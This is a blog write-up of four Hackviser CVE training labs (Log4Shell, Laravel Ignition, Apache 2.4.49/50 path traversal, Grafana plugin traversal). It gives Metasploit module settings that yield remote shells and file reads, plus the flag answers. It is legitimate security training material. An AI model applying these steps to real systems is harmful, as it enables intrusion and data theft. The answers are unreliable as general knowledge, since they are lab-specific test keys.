---
title: 'CVE 2021'
date: '2026-05-04'
excerpt: 'CVE-2021-44228, CVE-2021-3129, CVE-2021-42013, CVE-2021-43798'
prog: 'Hackviser CVE Labs  -  May 2026'
---

<div class="writeup-header">
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_hackviser_logo.webp" alt="Hackviser logo" class="writeup-logo" />
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">CVE 2021</h1>
<div class="writeup-date">May 2026 · CVE Labs</div>
</div>
</div>
<p class="lead mb-4">Practice Common Vulnerabilities and Exposures Labs</p>

<h4 class="mb-2">1. Apache Log4j Remote Code Execution (CVE-2021-44228)</h4>
<p class="mb-3">Apache Log4j is a widely used logging library in Java applications. In this lab environment, a vulnerable Spring Boot web application running Log4j 2.14.1 is deployed. The <code>/</code> and <code>/login</code> endpoints of the application log user-supplied input directly through Log4j without any sanitization. By injecting a <code>${jndi:ldap://...}</code> formatted payload into the <code>User-Agent</code> header or username parameter, an attacker can trigger Log4j's JNDI lookup mechanism. This allows a remote Java class to be loaded and executed on the target system, resulting in Remote Code Execution (RCE). Exploit the vulnerability to read the <code>/secret.txt</code> file on the server. What is the secret information inside the file?</p>
<p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2021-44228</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-44228/cvelabs_cve-2021-44228_image1.png" alt="CVE-2021-44228 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. Apparently an error in exploit execution occured.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-44228/cvelabs_cve-2021-44228_image2.png" alt="CVE-2021-44228 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">To solve this problem, we need to enter <code>set SRVHOST [local_IP]</code>. Then run <code>exploit</code> again. A command shell will open and we can query the contents of secret.txt</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-44228/cvelabs_cve-2021-44228_image3.png" alt="CVE-2021-44228 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Miranda</p>
<br />

<h4 class="mb-2">2. Laravel Framework < 8.4.2 Remote Code Execution (CVE-2021-3129)</h4>
<p class="mb-3">Laravel is a popular PHP framework used for developing web applications. Ignition is a debugging and error reporting tool used in Laravel and other products. This laboratory contains the CVE-2021-3129 vulnerability found in Laravel framework versions below 8.4.2 and the Ignition debugging component versions below 2.5.2. This vulnerability allows attackers to perform remote code execution (RCE) attacks, enabling malicious users to execute arbitrary commands on the target system and potentially gain full control over the system. What is the secret in the <code>/secret.txt</code> file?</p>
<p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2021-3129</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-3129/cvelabs_cve-2021-3129_image1.png" alt="CVE-2021-3129 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. A Command shell session will open and we simply run <code>cat /secret.txt</code> to obtain the secret information.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-3129/cvelabs_cve-2021-3129_image2.png" alt="CVE-2021-3129 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Demeter</p>
<br />

<h4 class="mb-2">3. Apache HTTP Server 2.4.49/2.4.50 Remote Code Execution (CVE-2021-42013)</h4>
<p class="mb-3">Apache HTTP Server is a popular open-source web server used to host and serve web content. This laboratory contains the CVE-2021-42013 vulnerability found in Apache HTTP Server versions 2.4.49 and 2.4.50. This vulnerability allows attackers to perform path traversal and remote code execution attacks, enabling the execution of arbitrary commands on the server and potentially taking control of the system. What is the secret in the <code>/secret.txt</code> file?</p>
<p class="mb-3"><strong>Steps: </strong>First we need to perform a simple Nmap scan to identify which ports are open on the target machine.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-42013/cvelabs_cve-2021-42013_image1.png" alt="CVE-2021-42013 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Then we use Metasploit via <code>msfconsole</code>. Run <code>search CVE-2021-42013</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-42013/cvelabs_cve-2021-42013_image2.png" alt="CVE-2021-42013 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code>, <code>set RPORT 80</code>, <code>set SSL false</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. Once the Meterpreter session open and we simply run <code>shell</code> and then <code>cat /secret.txt</code> to obtain the secret information.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-42013/cvelabs_cve-2021-42013_image3.png" alt="CVE-2021-42013 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Callisto</p>
<br />

<h4 class="mb-2">4. Grafana Directory Traversal (CVE-2021-43798)</h4>
<p class="mb-3">Grafana is a multi-platform open-source analytics and interactive visualization web application. A critical Directory Traversal vulnerability exists in Grafana versions 8.0.0-beta1 through 8.3.0. The flaw is located in the plugin asset loading mechanism. Grafana allows installed plugins (like alertlist, annolist, barchart) to serve static assets via the web interface. However, the application fails to properly sanitize user-supplied paths in the URL for these assets. By manipulating the URL with <code>../</code> sequences, an unauthenticated attacker can traverse outside the intended plugin directory. This allows reading arbitrary files from the server's filesystem, such as configuration files (<code>/etc/passwd</code>), application secrets (<code>grafana.ini</code>), or other sensitive data, compromising the confidentiality of the system. Exploit the vulnerability to read the <code>/secret.txt</code> file. What is the secret content?</p>
<p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2021-43798</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image1.png" alt="CVE-2021-43798 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set FILEPATH /secret.txt</code> and <code>set RHOSTS [target_IP]</code>. Then run <code>exploit</code> once ready. The exploit will download the targeted file and save it in the given directory path.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image2.png" alt="CVE-2021-43798 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Once we read the download file from the target machine, we obtain the secret information.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image3.png" alt="CVE-2021-43798 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Carbon</p>

<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">May 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>